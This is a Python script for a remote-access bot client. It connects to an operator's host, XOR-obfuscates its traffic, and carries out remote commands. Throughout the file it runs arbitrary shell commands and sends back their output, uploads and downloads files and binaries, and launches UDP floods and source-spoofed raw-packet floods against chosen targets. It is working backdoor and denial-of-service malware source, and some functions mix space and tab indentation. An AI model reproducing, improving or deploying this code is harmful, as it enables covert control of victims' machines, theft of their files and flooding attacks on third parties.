#!/usr/bin/python
# -*- coding: <UTF-8> -*-

from socket import socket, IPPROTO_UDP, IPPROTO_RAW , SOCK_DGRAM, SOCK_STREAM, SOCK_RAW, AF_INET
from subprocess import Popen, PIPE
from sys import exit as sysexit, argv
from time import sleep
from multiprocessing import Process, freeze_support
from pinject import UDP, IP

VERSION = "v0.0.6-full"

def getLen(string, maxLen):
    """Get the length of string.

    Keyword arguments:
    string -- the string whose length is to be returned
    maxLen -- the maximum length of the string
    """
    tmp_str = str(len(string))
    lenToReturn = tmp_str
    for i in range(maxLen - len(tmp_str)):
        lenToReturn = '0' + lenToReturn
    return lenToReturn

def make_en_STDOUT(STDOUT,sock):
	en_STDOUT = bytearray(STDOUT,'UTF-8')
	for i in range(len(en_STDOUT)):
		en_STDOUT[i] ^=0x41
	try:
		sock.send(en_STDOUT)
	except:
		sock.close()
		return 1
	return 0

def make_en_bin_STDOUT(STDOUT,sock):
	en_STDOUT = bytearray(STDOUT)
	for i in range(len(en_STDOUT)):
		en_STDOUT[i] ^=0x41
	try:
		sock.send(en_STDOUT)
	except:
		sock.close()
		return 1
	return 0

def make_en_data(data):
	en_data = bytearray(data)
	for i in range(len(en_data)):
		en_data[i] ^=0x41
	return en_data.decode('UTF-8')

def make_en_bin_data(data):
	en_data = bytearray(data)
	for i in range(len(en_data)):
		en_data[i] ^=0x41
	return en_data

def get_en_data(sock, size):
	data = sock.recv(size)
	return make_en_data(data)

def get_en_bin_data(sock, size):
	data = sock.recv(size)
	return make_en_bin_data(data)

def UDP_Flood(target_IP, target_Port,msg):
	flood_sock = socket(AF_INET, SOCK_DGRAM)
	while True:
		flood_sock.sendto(bytes(msg), (target_IP,target_Port))
		sleep(0.01)

def UDP_Spoof(DEST_IP,DEST_PORT,SOURCE_IP,SOURCE_PORT,PAYLOAD):
    """
    Creates a packet with desired destination ip, destination port, source port and source ip
    Keyword arguments:
    DEST_IP -- the desired destination ip
    DEST_PORT -- the desired destination port
    SOURCE_IP -- the desired source ip
    SOURCE_PORT -- the desired source port
    """
	UDP_HEADER = UDP(SOURCE_PORT,DEST_PORT,PAYLOAD).pack(SOURCE_IP,DEST_IP)
	IP_HEADER = IP(SOURCE_IP,DEST_IP,UDP_HEADER,IPPROTO_UDP).pack()
	return IP_HEADER+UDP_HEADER+PAYLOAD

def UDP_Spoof_Send(TARGET_IP,TARGET_PORT,SPOOFED_IP,SPOOFED_PORT,PAYLOAD):
    """
    Spoofs a packet and sends it to TARGET_IP, TARGET_PORT
    Keyword arguments:
    TARGET_IP -- the desired destination ip
    TARGET_PORT -- the desired destination port
    SPOOFED_IP -- the desired source ip
    SPOOFED_PORT -- the desired source port
    """
	spoofed_packet = UDP_Spoof(TARGET_IP,TARGET_PORT,SPOOFED_IP,SPOOFED_PORT,PAYLOAD)
	sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)
	while True:
		sock.sendto(spoofed_packet, (TARGET_IP,TARGET_PORT))
		sleep(0.01)

comm_dict = {
	'00000' : 'killMe',
	'00001' : 'getFile',
	'00002' : 'getBinary',
	'00003' : 'sendFile',
	'00004' : 'sendBinary',
	'00005' : 'udpFlood',
	'00006' : 'udpSpoof',
	'00007' : 'command',
	'00008' : 'KILL'
}

def main():
	try:
		RHOST = argv[1]
		RPORT = 9000
	except:
		print ("Must provide hotst")
		sysexit()
	s = socket(AF_INET, SOCK_STREAM)
	s.connect((RHOST,RPORT))
	en_STDOUT = make_en_STDOUT(VERSION,s)
	if en_STDOUT == 1:
		sysexit()

	while True:
		en_data = get_en_data(s,5)
		try:
			en_data = comm_dict[en_data]
		except:
			continue
		if en_data == 'killMe':
			break
		elif en_data == 'getFile':
			en_data = get_en_data(s,3) #Filename length up to 999 chars
			en_data = get_en_data(s,int(en_data))
			try:
				fileToWrite = open(en_data,'w')
				STDOUT = 'fcs'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			fSize = get_en_data(s,13) #File size up to 9999999999999 chars
			en_data = get_en_data(s,int(fSize))
			fileToWrite.write(en_data)
			fileToWrite.close()
			STDOUT = "fsw"
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "getBinary":
			en_data = get_en_data(s,3) #Filename length up to 999 chars
			en_data = get_en_data(s,int(en_data))
			try:
				binToWrite = open(en_data,'wb')
				STDOUT = 'fcs'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			bSize = get_en_data(s,13) #Binary size up to 9999999999999 symbols
			en_data = get_en_bin_data(s, int(bSize))
			binToWrite.write(en_data)
			binToWrite.close()
			STDOUT = "fsw"
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "sendFile":
			en_data = get_en_data(s,3) #Filename length up to 999 chars
			en_data = get_en_data(s,int(en_data))
			try:
				fileToSend = open(en_data,'r')
				STDOUT = 'fos'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			fileCont = fileToSend.read()
			fileToSend.close()
			STDOUT = getLen(fileCont,13)
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			STDOUT = fileCont
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "sendBinary":
			en_data = get_en_data(s,3) #Filename length up to 999 chars
			en_data = get_en_data(s,int(en_data))
			try:
				binToSend = open(en_data,'rb')
				STDOUT = 'fos'
			except:
				STDOUT = 'fna'
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			if STDOUT == 'fna':
				continue
			binCont = binToSend.read()
			binToSend.close()
			STDOUT = getLen(binCont,13)
			en_STDOUT = make_en_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
			STDOUT = binCont
			en_STDOUT = make_en_bin_STDOUT(STDOUT,s)
			if en_STDOUT == 1:
				sysexit()
		elif en_data == "udpFlood":
			en_data = get_en_data(s,3) # Max ip+port+payload length 999 chars
			en_data = get_en_data(s,int(en_data))
			en_data = en_data.split(":")
			targetIP = en_data[0]
			targetPort = int(en_data[1])
			msg = en_data[2]
			p = Process(target=UDP_Flood, args=(targetIP,targetPort,msg))
			p.start()
			while True:
				en_data = get_en_data(s,5)
				if en_data == "00008": # '00008' => 'KILL'
					p.terminate()
					break
		elif en_data == "udpSpoof":
			en_data = get_en_data(s,3)
			en_data = get_en_data(s,int(en_data))
			en_data = en_data.split(":")
			targetIP = en_data[0]
			targetPort = int(en_data[1])
			spoofedIP = en_data[2]
			spoofedPort = int(en_data[3])
			payload = en_data[4].encode('UTF-8')
			p = Process(target=UDP_Spoof_Send, args=(targetIP,targetPort,spoofedIP,spoofedPort,payload))
			p.start()
			while True:
				en_data = get_en_data(s,5)
				if en_data == "00008": # '00008' => 'KILL'
					p.terminate()
					break
		elif en_data == "command":
			en_data = get_en_data(s, 13)
			en_data = get_en_data(s,int(en_data))
			comm = Popen(en_data, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
			STDOUT,STDERR = comm.communicate()
			if STDERR:
				decode = STDERR.decode('UTF-8')
			elif STDOUT:
				decode = STDOUT.decode('UTF-8')
			else:
				decode = 'Command has no output'
			lenDecode = getLen(decode,13)
			en_STDOUT = make_en_STDOUT(lenDecode,s)
			if en_STDOUT == 1:
				sysexit()
			en_STDOUT = make_en_STDOUT(decode,s)
			if en_STDOUT == 1:
				sysexit()
	s.close()

#Start Here!
if __name__ == '__main__':
	freeze_support()
	Process(target=main).start()
